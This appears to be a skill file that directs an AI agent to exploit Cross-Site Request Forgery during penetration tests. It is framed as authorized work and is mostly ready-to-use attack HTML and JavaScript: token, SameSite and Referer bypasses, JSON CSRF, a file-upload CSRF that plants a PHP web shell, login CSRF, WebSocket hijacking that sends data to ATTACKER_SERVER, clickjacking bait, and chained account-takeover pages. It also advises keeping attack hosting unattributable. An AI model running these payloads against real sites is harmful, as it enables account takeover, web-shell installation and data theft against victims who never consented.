---
name: csrf
description: >
  Exploit Cross-Site Request Forgery (CSRF) vulnerabilities during authorized
  penetration testing.
keywords:
  - csrf
  - cross-site request forgery
  - csrf bypass
  - csrf token bypass
  - samesite bypass
  - json csrf
  - csrf poc
  - anti-csrf bypass
  - state-changing attack
  - forged request
  - csrf token
  - login csrf
  - cross-site request
tools:
  - burpsuite (CSRF PoC generator)
  - curl
opsec: low
---

# CSRF (Cross-Site Request Forgery)

You are helping a penetration tester exploit CSRF vulnerabilities. The target
application performs state-changing actions (password change, email update,
role modification, fund transfer) without properly verifying that the request
originated from the application itself. The goal is to demonstrate that an
attacker can trick a victim's browser into making authenticated requests to
the target. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[csrf] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Web Interaction

CSRF testing benefits from browser tools because **browser-enforced protections
(SameSite cookies, CORS) only apply in a real browser context** — curl bypasses
them, which can produce false positives.

- **`browser_evaluate`** to test SameSite cookie behavior (check if cookies
  are sent on cross-origin requests in a real browser)
- **`browser_open`** to load PoC HTML pages that submit cross-origin requests
  — confirms real exploitability with browser-enforced protections active
- **`browser_cookies`** to inspect SameSite attributes and cookie flags
- **`browser_screenshot`** for evidence of successful CSRF exploitation
- **curl** for initial request analysis, token extraction, and testing
  server-side defenses (Referer/Origin checks, token validation)

## Prerequisites

- A state-changing endpoint to target (password change, email update, role
  modification, fund transfer, account settings)
- An authenticated session (to capture the legitimate request)
- A domain you control for hosting PoC pages (or Burp Collaborator)
- Knowledge of the target's CSRF defenses (token, SameSite, Referer check)

## Step 1: Assess

Capture the target state-changing request and identify defenses.

### Map State-Changing Endpoints

Look for POST/PUT/PATCH/DELETE requests that modify data:
- Account settings (email, password, profile)
- Financial operations (transfers, purchases)
- Administrative actions (role changes, user management)
- Content management (create, edit, delete)

### Identify CSRF Defenses

```bash
# Capture a legitimate request and check for:

# 1. CSRF token in form body or header
grep -i "csrf\|token\|_token\|authenticity" response.html

# 2. SameSite cookie attribute
curl -sI "https://TARGET/login" | grep -i "set-cookie"
# Look for: SameSite=Strict, SameSite=Lax, SameSite=None, or absent

# 3. Referer/Origin validation
# Send request without Referer — does it still work?
curl -s -X POST -H "Cookie: session=VALID" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=test@test.com" \
  "https://TARGET/change-email"

# 4. Custom header requirement (X-CSRF-Token, X-Requested-With)
# Check if the endpoint requires a custom header that forms can't set
```

## Step 2: Token Bypass

Test the CSRF token validation for weaknesses.

### Remove Token Entirely

The most common bypass — the server validates the token when present but
accepts requests without it:

```html
<form method="POST" action="https://TARGET/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <!-- csrf_token parameter completely omitted -->
</form>
<script>document.forms[0].submit();</script>
```

### Empty Token Value

```html
<form method="POST" action="https://TARGET/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf_token" value="" />
</form>
<script>document.forms[0].submit();</script>
```

### Token Not Tied to Session

Use a token from your own session in the attack against the victim:

1. Log in with your attacker account
2. Extract your CSRF token from the page source
3. Use it in the PoC — if the server validates tokens globally (not per-session),
   your token works for any user

### Token from Another Endpoint

Some applications use a single token pool. Extract a token from one endpoint
and use it on the target endpoint.

### Static or Predictable Token

Check if the token changes between requests. If it's static or follows a
pattern (timestamp, sequential), it can be predicted.

### Method Switch (POST to GET)

Some applications only validate CSRF on POST. Try converting to GET:

```html
<!-- Original POST with token validation -->
<!-- Bypass: same action as GET without token -->
<img src="https://TARGET/change-email?email=attacker@evil.com" />
```

## Step 3: SameSite Cookie Bypass

If the session cookie uses SameSite, determine the level and test bypasses.

### SameSite=None

No protection — standard CSRF attacks work:

```html
<form method="POST" action="https://TARGET/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### SameSite=Lax (or Default in Chrome)

Lax allows cookies on **top-level GET navigations** (link clicks, form GET
submissions, redirects). POST forms and subresource requests are blocked.

**Bypass 1: GET-based state change**

If the endpoint accepts GET:
```html
<!-- Top-level navigation with GET — cookies sent with Lax -->
<a href="https://TARGET/change-email?email=attacker@evil.com">Click here</a>

<!-- Auto-redirect -->
<script>
  window.location = "https://TARGET/change-email?email=attacker@evil.com";
</script>
```

**Bypass 2: Method override**

```html
<!-- POST endpoint that accepts _method override via GET -->
<a href="https://TARGET/change-email?_method=POST&email=attacker@evil.com">
  Click here
</a>
```

**Bypass 3: 2-minute window (Chrome default Lax)**

If the cookie has no explicit SameSite attribute, Chrome treats it as Lax
but allows cross-site POST for 2 minutes after the cookie is set. If the
victim just logged in, a standard POST CSRF may work within this window.

### SameSite=Strict

Cookies never sent on cross-site requests. Bypasses require same-site context:

**Bypass via sibling subdomain XSS**: If you find XSS on any subdomain of the
same site (e.g., `blog.target.com`), you can launch CSRF from there because
it's same-site.

**Bypass via client-side redirect**: If the target has an open redirect or
client-side navigation that can be triggered cross-site, the subsequent
request is same-site.

### SameSite Behavior Matrix

| Request Type | Strict | Lax | None |
|-------------|--------|-----|------|
| Top-level link (`<a>`) | No | Yes | Yes |
| Form GET | No | Yes | Yes |
| Form POST | No | No | Yes |
| iframe | No | No | Yes |
| AJAX/fetch | No | No | Yes |
| `<img>` | No | No | Yes |

## Step 4: Referer/Origin Header Bypass

### Suppress Referer

If the server only validates Referer when present:

```html
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form method="POST" action="https://TARGET/change-email">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

### Referer Regex Bypass

If the server checks that Referer contains the target domain:

```html
<html>
<head>
  <!-- Send full URL as Referer so target domain appears in it -->
  <meta name="referrer" content="unsafe-url">
</head>
<body>
  <script>
    // Put target domain in the query string of our attacker page
    history.pushState("", "", "?https://TARGET");
  </script>
  <form method="POST" action="https://TARGET/change-email">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

The Referer sent will be: `https://attacker.com/?https://TARGET` — passes
substring checks for the target domain.

### Origin Header

The Origin header is harder to spoof. If the server checks Origin:
- Forms set Origin automatically (can't be suppressed)
- Only option is same-site context (XSS on subdomain, open redirect)

## Step 5: Content-Type Tricks (JSON CSRF)

When the endpoint expects JSON, HTML forms can't set `Content-Type: application/json`
without triggering a CORS preflight. Use these bypasses.

### Form with text/plain Encoding

```html
<form method="POST" action="https://TARGET/api/change-email"
      enctype="text/plain">
  <input type="hidden"
         name='{"email":"attacker@evil.com","ignore":"'
         value='"}' />
</form>
<script>document.forms[0].submit();</script>
```

Request body becomes: `{"email":"attacker@evil.com","ignore":"="}` — valid JSON
if the server ignores the extra field.

### Fetch with text/plain (No Preflight)

```html
<script>
fetch('https://TARGET/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"attacker@evil.com"}'
});
</script>
```

No CORS preflight for `text/plain`, but the server must accept the request
without `Content-Type: application/json`.

### navigator.sendBeacon

```html
<script>
navigator.sendBeacon(
  'https://TARGET/api/change-email',
  new Blob(['{"email":"attacker@evil.com"}'], {type: 'text/plain'})
);
</script>
```

### XHR with application/x-www-form-urlencoded

If the server parses JSON from form-encoded content:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://TARGET/api/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('{"email":"attacker@evil.com"}');
</script>
```

## Step 6: Advanced Techniques

### File Upload CSRF

```html
<script>
function upload() {
  var file = new File(
    ['<?php system($_GET["cmd"]); ?>'],
    'shell.php',
    {type: 'application/x-php'}
  );
  var dt = new DataTransfer();
  dt.items.add(file);
  document.getElementById('fileInput').files = dt.files;
  document.forms[0].submit();
}
</script>
<form method="POST" action="https://TARGET/upload"
      enctype="multipart/form-data" style="display:none">
  <input id="fileInput" type="file" name="file" />
</form>
<script>upload();</script>
```

### Login CSRF

Force the victim to log into the attacker's account:

```html
<form method="POST" action="https://TARGET/login">
  <input type="hidden" name="username" value="attacker" />
  <input type="hidden" name="password" value="AttackerPass123!" />
</form>
<script>document.forms[0].submit();</script>
```

**Impact**: Victim is now authenticated as the attacker. If the victim enters
sensitive data (credit card, address), the attacker can retrieve it from their
own account. Also exploitable if combined with stored XSS in the attacker's
account.

### Cookie Injection via CRLF for Double-Submit Bypass

If the app uses double-submit cookie pattern (token in cookie must match token
in body), inject a cookie via CRLF or subdomain:

```html
<!-- Set cookie via CRLF injection in a parameter -->
<img src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrf=attacker_token"
     onerror="document.forms[0].submit();" />
<form method="POST" action="https://TARGET/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="attacker_token" />
</form>
```

### WebSocket CSRF (Cross-Site WebSocket Hijacking)

WebSocket handshakes don't have CORS protection — cookies are sent automatically:

```html
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onopen = function() {
  // Send commands as the victim
  ws.send(JSON.stringify({action: 'transfer', amount: 1000, to: 'attacker'}));
};
ws.onmessage = function(event) {
  // Exfiltrate data
  fetch('https://ATTACKER_SERVER/exfil', {
    method: 'POST',
    body: event.data
  });
};
</script>
```

### Clickjacking + CSRF

If the target is frameable (no X-Frame-Options or CSP frame-ancestors):

```html
<style>
  iframe { position: absolute; width: 500px; height: 600px;
           opacity: 0.0001; z-index: 2; }
  .bait { position: absolute; top: 350px; left: 150px; z-index: 1;
          font-size: 24px; cursor: pointer; }
</style>
<div class="bait">Click to claim your prize!</div>
<iframe src="https://TARGET/settings?email=attacker@evil.com"></iframe>
```

The victim clicks the "bait" text but actually clicks the submit button in
the invisible iframe.

## Step 7: Build PoC Page

Once a bypass is confirmed, build a complete PoC page.

### Standard POST CSRF PoC

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <p>This page demonstrates CSRF on [TARGET]</p>
  <form id="csrf" method="POST" action="https://TARGET/change-email">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    // Auto-submit after 1 second (for demo purposes)
    setTimeout(function() { document.getElementById('csrf').submit(); }, 1000);
  </script>
  <noscript>
    <p>JavaScript required. Click the button below:</p>
    <input type="submit" form="csrf" value="Submit" />
  </noscript>
</body>
</html>
```

### Silent PoC (Hidden iframe)

```html
<!DOCTYPE html>
<html>
<body>
  <iframe name="csrfFrame" style="display:none"></iframe>
  <form id="csrf" method="POST" action="https://TARGET/change-email"
        target="csrfFrame">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
  <p>Loading...</p>
</body>
</html>
```

### Multi-Action PoC (Chained Requests)

```html
<script>
async function chain() {
  // Step 1: Change email
  var f1 = document.createElement('form');
  f1.method = 'POST'; f1.action = 'https://TARGET/change-email';
  f1.target = 'frame1';
  var i1 = document.createElement('input');
  i1.type = 'hidden'; i1.name = 'email'; i1.value = 'attacker@evil.com';
  f1.appendChild(i1); document.body.appendChild(f1); f1.submit();

  // Wait for first action to complete
  await new Promise(r => setTimeout(r, 2000));

  // Step 2: Request password reset (goes to attacker's email)
  var f2 = document.createElement('form');
  f2.method = 'POST'; f2.action = 'https://TARGET/reset-password';
  f2.target = 'frame2';
  document.body.appendChild(f2); f2.submit();
}
chain();
</script>
<iframe name="frame1" style="display:none"></iframe>
<iframe name="frame2" style="display:none"></iframe>
```

## Step 8: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## OPSEC Notes

- CSRF testing is inherently low-OPSEC — you're crafting HTML pages, not
  attacking the server directly
- Token bypass testing (removing/modifying parameters) looks like normal
  requests with malformed data
- PoC pages must be hosted on your controlled domain — ensure it's not
  attributable if OPSEC matters
- The actual attack requires victim interaction (visiting your page) —
  no server-side artifacts beyond the forged request
- WebSocket CSRF maintains a persistent connection — visible in connection logs

## Troubleshooting

### Token Present and Validated

- Try removing the token parameter entirely (not just emptying it)
- Try a token from a different user session
- Try a token from a different endpoint
- Check if the token changes between requests (if static, extract and reuse)
- Look for XSS to extract the token dynamically

### SameSite Blocking Cookies

- Check the exact SameSite value (`Strict`, `Lax`, or `None`)
- For Lax: try GET-based state changes or method override
- For Strict: look for XSS on a same-site subdomain
- Check if any cookies lack SameSite (legacy cookies may default differently)
- Test within 2 minutes of login (Chrome's Lax-by-default grace period)

### JSON Endpoint Requires application/json

- Try `text/plain` encoding (no preflight)
- Try `application/x-www-form-urlencoded` with JSON body
- Check if the endpoint accepts form-encoded data as alternative
- If CORS is misconfigured, use fetch with `application/json` (preflight
  will pass if CORS allows your origin)

### PoC Auto-Submit Doesn't Work

- Check for frame-busting scripts (target may use `X-Frame-Options`)
- Try top-level navigation instead of iframe submission
- Ensure the form action URL is correct (HTTPS vs HTTP, path)
- Check browser console for CSP violations blocking inline scripts
- Test in a private/incognito window

### Referer Check Blocks Request

- Try `<meta name="referrer" content="no-referrer">` to suppress Referer
- If that fails, put the target domain in the query string with `unsafe-url`
- Check if Referer validation is only on POST (try GET)
- Check if removing both Referer and Origin works
